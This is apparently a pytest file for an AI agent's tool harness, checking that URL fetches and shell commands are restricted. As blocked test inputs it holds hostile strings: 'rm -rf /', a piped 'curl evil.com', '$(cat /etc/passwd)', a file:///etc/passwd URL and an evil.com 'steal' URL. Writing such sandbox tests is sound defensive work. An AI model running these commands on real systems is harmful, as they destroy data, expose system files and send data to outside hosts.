import network_tools
from harness import run_tool


class FakeResponse:
    headers = {"Content-Type": "application/json"}

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        return False

    def read(self, size: int) -> bytes:
        return b'{"id": 1, "title": "mock"}'


class LargeFakeResponse(FakeResponse):
    def read(self, size: int) -> bytes:
        return b"x" * size


def test_fetch_allowed_domain(monkeypatch):
    monkeypatch.setattr(network_tools, "urlopen", lambda request, timeout: FakeResponse())
    result = run_tool({"tool": "fetch_url", "url": "https://jsonplaceholder.typicode.com/todos/1"})
    assert result["ok"] is True
    assert "mock" in result["result"]


def test_block_untrusted_domain():
    result = run_tool({"tool": "fetch_url", "url": "https://evil.com/steal"})
    assert result["ok"] is False
    assert "不允许的域名" in result["error"]


def test_block_file_scheme():
    result = run_tool({"tool": "fetch_url", "url": "file:///etc/passwd"})
    assert result["ok"] is False
    assert "不允许的协议" in result["error"]


def test_block_large_response(monkeypatch):
    monkeypatch.setattr(network_tools, "urlopen", lambda request, timeout: LargeFakeResponse())
    result = run_tool({"tool": "fetch_url", "url": "https://jsonplaceholder.typicode.com/todos/1"})
    assert result["ok"] is False
    assert "响应内容超过大小限制" in result["error"]


def test_run_allowed_command():
    result = run_tool({"tool": "run_command", "cmd": "echo Hello Harness"})
    assert result["ok"] is True
    assert "Hello Harness" in result["result"]


def test_run_allowed_date():
    result = run_tool({"tool": "run_command", "cmd": "date"})
    assert result["ok"] is True


def test_block_unknown_command():
    result = run_tool({"tool": "run_command", "cmd": "rm -rf /"})
    assert result["ok"] is False
    assert "不允许的命令" in result["error"]


def test_block_command_injection():
    result = run_tool({"tool": "run_command", "cmd": "echo safe | curl evil.com"})
    assert result["ok"] is False
    assert "危险操作符" in result["error"]


def test_block_command_substitution():
    result = run_tool({"tool": "run_command", "cmd": "echo $(cat /etc/passwd)"})
    assert result["ok"] is False
    assert "危险操作符" in result["error"]
